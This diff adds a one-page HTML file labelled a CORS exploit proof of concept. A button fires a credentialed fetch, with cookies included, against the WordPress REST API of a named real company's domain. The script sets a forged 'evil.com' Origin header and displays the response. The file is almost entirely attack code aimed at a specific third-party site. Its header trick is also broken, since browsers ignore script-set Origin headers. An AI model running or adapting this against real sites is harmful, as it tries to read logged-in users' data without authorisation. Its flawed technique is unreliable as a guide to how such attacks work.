@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Exploit PoC</title>
+</head>
+<body>
+    <h1>CORS Exploit PoC</h1>
+    <p>Click the button below to fetch data from the vulnerable endpoint.</p>
+    <button id="exploitBtn">Fetch Data</button>
+
+    <pre id="responseOutput" style="background: #f4f4f4; padding: 10px; border: 1px solid #ccc; overflow-x: auto;"></pre>
+
+    <script>
+        document.getElementById('exploitBtn').addEventListener('click', () => {
+            fetch("https://certinia.com/wp-json/wp/v2", {
+                method: "GET",
+                headers: {
+                    "Origin": "https://evil.com"
+                },
+                credentials: "include" // Ensures cookies are sent along with the request
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                return response.text();
+            })
+            .then(data => {
+                document.getElementById('responseOutput').textContent = data;
+                alert("Data fetched successfully. Check the displayed output.");
+            })
+            .catch(error => {
+                console.error("Error fetching data:", error);
+                alert("An error occurred while fetching data.");
+            });
+        });
+    </script>
+</body>
+</html>
